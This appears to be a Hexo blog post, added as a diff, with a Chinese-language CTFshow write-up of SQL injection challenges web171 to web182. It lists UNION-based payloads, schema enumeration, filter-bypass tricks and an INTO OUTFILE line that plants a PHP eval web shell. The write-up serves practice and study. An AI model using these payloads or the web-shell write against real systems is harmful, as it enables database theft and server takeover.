@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>web171-253 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="sql注入知识点replace函数 replace(username,’1’,’a’) 将username中的1换成a    返回结果过滤数字     构造   1-1&amp;#x27; union select replace(username,&amp;#x27;g&amp;#x27;,&amp;#x27;j&amp;#x27;),replace(replace(replace(replace(replace(replace(re">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web171-253">
+<meta property="og:url" content="http://example.com/2023/06/01/web171-253/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="sql注入知识点replace函数 replace(username,’1’,’a’) 将username中的1换成a    返回结果过滤数字     构造   1-1&amp;#x27; union select replace(username,&amp;#x27;g&amp;#x27;,&amp;#x27;j&amp;#x27;),replace(replace(replace(replace(replace(replace(re">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/06/01/web171-253/image-20221008211918774.png">
+<meta property="og:image" content="http://example.com/2023/06/01/web171-253/image-20221008204945094.png">
+<meta property="og:image" content="http://example.com/2023/06/01/web171-253/image-20221008205108590.png">
+<meta property="og:image" content="http://example.com/2023/06/01/web171-253/image-20221008205201844.png">
+<meta property="og:image" content="http://example.com/2023/06/01/web171-253/image-20221008210146585.png">
+<meta property="og:image" content="http://example.com/2023/06/01/web171-253/image-20221008211751498.png">
+<meta property="article:published_time" content="2023-06-01T13:00:00.000Z">
+<meta property="article:modified_time" content="2023-06-01T13:29:43.791Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/06/01/web171-253/image-20221008211918774.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-web171-253" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/06/01/web171-253/" class="article-date">
+  <time class="dt-published" datetime="2023-06-01T13:00:00.000Z" itemprop="datePublished">2023-06-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTFshow/">CTFshow</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      web171-253
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><h4 id="replace函数"><a href="#replace函数" class="headerlink" title="replace函数"></a>replace函数</h4><blockquote>
+<p>replace(username,’1’,’a’)</p>
+<p>将<code>username</code>中的<code>1</code>换成<code>a</code></p>
+</blockquote>
+<blockquote>
+<ol>
+<li>返回结果过滤数字</li>
+</ol>
+<p> <img src="/2023/06/01/web171-253/image-20221008211918774.png"></p>
+<ol start="2">
+<li>构造</li>
+</ol>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select replace(username,&#x27;g&#x27;,&#x27;j&#x27;),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&#x27;1&#x27;,&#x27;A&#x27;),&#x27;2&#x27;,&#x27;B&#x27;),&#x27;3&#x27;,&#x27;C&#x27;),&#x27;4&#x27;,&#x27;D&#x27;),&#x27;5&#x27;,&#x27;E&#x27;),&#x27;6&#x27;,&#x27;F&#x27;),&#x27;7&#x27;,&#x27;G&#x27;),&#x27;8&#x27;,&#x27;H&#x27;),&#x27;9&#x27;,&#x27;I&#x27;),&#x27;0&#x27;,&#x27;J&#x27;) from ctfshow_user4 where username=&#x27;flag&#x27;--+</span><br></pre></td></tr></table></figure>
+
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">将ctfshow&#123;JAHcIBJJ-dIEH-DfBE-abdb-eDdBbfGDDdAA&#125;中各个字符转化即可</span><br><span class="line"></span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    s = input(string)</span><br><span class="line">    dict = &#123;&#x27;A&#x27;: 1, &#x27;B&#x27;: 2,&#x27;C&#x27;: 3, &#x27;D&#x27;: 4, &#x27;E&#x27;: 5, &#x27;F&#x27;: 6, &#x27;G&#x27;: 7, &#x27;H&#x27;: 8, &#x27;I&#x27;: 9, &#x27;J&#x27;: 0&#125;</span><br><span class="line">    for i in s:</span><br><span class="line">        if i in dict:</span><br><span class="line">            print(dict[i], end=&#x27;&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            print(i, end=&#x27;&#x27;)</span><br><span class="line">得到</span><br><span class="line">ctfshow&#123;018c9200-d958-4f25-abdb-e4d2bf744d11&#125;</span><br></pre></td></tr></table></figure>
+
+</blockquote>
+<h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><blockquote>
+<ol>
+<li>根据提示</li>
+</ol>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p> 可得是单引号闭合</p>
+<ol start="2">
+<li>构造</li>
+</ol>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;union select 1,password,3 from ctfshow_user --+</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><blockquote>
+<ol>
+<li>有两个注入点</li>
+</ol>
+<p><img src="/2023/06/01/web171-253/image-20221008204945094.png"></p>
+<ol start="2">
+<li><p>先写第一个吧</p>
+</li>
+<li><p><img src="/2023/06/01/web171-253/image-20221008205108590.png"></p>
+</li>
+<li><p>正常注入即可</p>
+</li>
+</ol>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,password from ctfshow_user2 --+</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><p>第二个</p>
+</li>
+<li><p><img src="/2023/06/01/web171-253/image-20221008205201844.png"></p>
+</li>
+<li><p>正常注入即可</p>
+</li>
+</ol>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,password from ctfshow_user2 --+v</span><br><span class="line">-1&#x27; union select 1,&quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile&#x27;/var/www/html/1.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">  </span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h3><blockquote>
+<ol>
+<li>大概知道为什么上一题有两个了</li>
+</ol>
+<p> <img src="/2023/06/01/web171-253/image-20221008210146585.png"></p>
+<ol start="2">
+<li>正常注入。。</li>
+</ol>
+</blockquote>
+<h3 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h3><blockquote>
+<ol>
+<li>返回结果过滤</li>
+</ol>
+<p> <img src="/2023/06/01/web171-253/image-20221008211751498.png"></p>
+<ol start="2">
+<li>构造</li>
+</ol>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select replace(username,&#x27;g&#x27;,&#x27;j&#x27;),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&#x27;1&#x27;,&#x27;A&#x27;),&#x27;2&#x27;,&#x27;B&#x27;),&#x27;3&#x27;,&#x27;C&#x27;),&#x27;4&#x27;,&#x27;D&#x27;),&#x27;5&#x27;,&#x27;E&#x27;),&#x27;6&#x27;,&#x27;F&#x27;),&#x27;7&#x27;,&#x27;G&#x27;),&#x27;8&#x27;,&#x27;H&#x27;),&#x27;9&#x27;,&#x27;I&#x27;),&#x27;0&#x27;,&#x27;J&#x27;),&#x27;g&#x27;,&#x27;j&#x27;) from ctfshow_user4 where username=&#x27;flag&#x27;--+</span><br></pre></td></tr></table></figure>
+
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">将ctfshow&#123;JAHcIBJJ-dIEH-DfBE-abdb-eDdBbfGDDdAA&#125;中各个字符转化即可</span><br><span class="line"></span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    s = input(string)</span><br><span class="line">    dict = &#123;&#x27;A&#x27;: 1, &#x27;B&#x27;: 2,&#x27;C&#x27;: 3, &#x27;D&#x27;: 4, &#x27;E&#x27;: 5, &#x27;F&#x27;: 6, &#x27;G&#x27;: 7, &#x27;H&#x27;: 8, &#x27;I&#x27;: 9, &#x27;J&#x27;: 0&#125;</span><br><span class="line">    for i in s:</span><br><span class="line">        if i in dict:</span><br><span class="line">            print(dict[i], end=&#x27;&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            print(i, end=&#x27;&#x27;)</span><br><span class="line">得到</span><br><span class="line">ctfshow&#123;018c9200-d958-4f25-abdb-e4d2bf744d11&#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h3><blockquote>
+</blockquote>
+<h3 id="web176-大小写绕过"><a href="#web176-大小写绕过" class="headerlink" title="web176 (大小写绕过)"></a>web176 (大小写绕过)</h3><blockquote>
+<ol>
+<li>过滤了<code>select</code>，但是可以用大写绕过</li>
+</ol>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union sElect 1,2,3--+</span><br><span class="line">1&#x27; union sElect 1,2,database()--+</span><br><span class="line">1&#x27; union sElect 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;--+</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">1&#x27; union sElect 1,2,group_concat(column_name) from information_schema.columns where table_name = &#x27;ctfshow_user&#x27;--+</span><br><span class="line">1&#x27; union sElect 1,2,password from ctfshow_user--+</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">1&#x27; union sElect * from ctfshow_user--+</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">&#x27; or username=&#x27;flag&#x27; --+</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">&#x27; or 1=1 --+</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="web177-过滤空格"><a href="#web177-过滤空格" class="headerlink" title="web177 (过滤空格)"></a>web177 (过滤空格)</h3><blockquote>
+<ol>
+<li>过滤了空格，一下可以代替空格</li>
+</ol>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%09</span><br><span class="line">%0a</span><br><span class="line">%0d</span><br><span class="line">%0c</span><br><span class="line">/**/</span><br><span class="line">+</span><br></pre></td></tr></table></figure>
+
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;union%09sElect%091,2,3--%09</span><br><span class="line">1&#x27;union%09sElect%09*%09from%09ctfshow_user--%09</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h3><blockquote>
+<ol>
+<li>过滤了空格，web177也能过，但是换种姿势</li>
+</ol>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1&#x27;%23</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h3><blockquote>
+<ol>
+<li>过滤空格， <code>%0c</code> 未被过滤</li>
+</ol>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0c</span><br></pre></td></tr></table></figure>
+
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;uNion%0csElect%0c1,2,3--%0c</span><br><span class="line">1&#x27;%0cunion%0csElect%0c1,2,%0cgroup_concat(password)%0cfrom%0c`ctfshow_user`%23</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h3><blockquote>
+<ol>
+<li>过滤了 <code>#</code></li>
+</ol>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;%0cunion%0cselect%0c1,2,database()--%0c</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h3><blockquote>
+<ol>
+<li>过滤了所有空格</li>
+</ol>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;or(username)=&#x27;flag</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h3><blockquote>
+<ol>
+<li>过滤了 <code>flag</code> ，使用 <code>like</code> 模糊查询</li>
+</ol>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;or%0cusername%0clike%0c&#x27;%fl%</span><br></pre></td></tr></table></figure></blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/06/01/web171-253/" data-id="clid6c3ue00008suzhf5w627b" data-title="web171-253" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/06/01/web1-web28/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Web1 - Web28</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTFshow/">CTFshow</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/ciscn/">ciscn</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/06/01/web171-253/">web171-253</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/01/web1-web28/">Web1 - Web28</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/01/ciscn-web/">ciscn-web</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
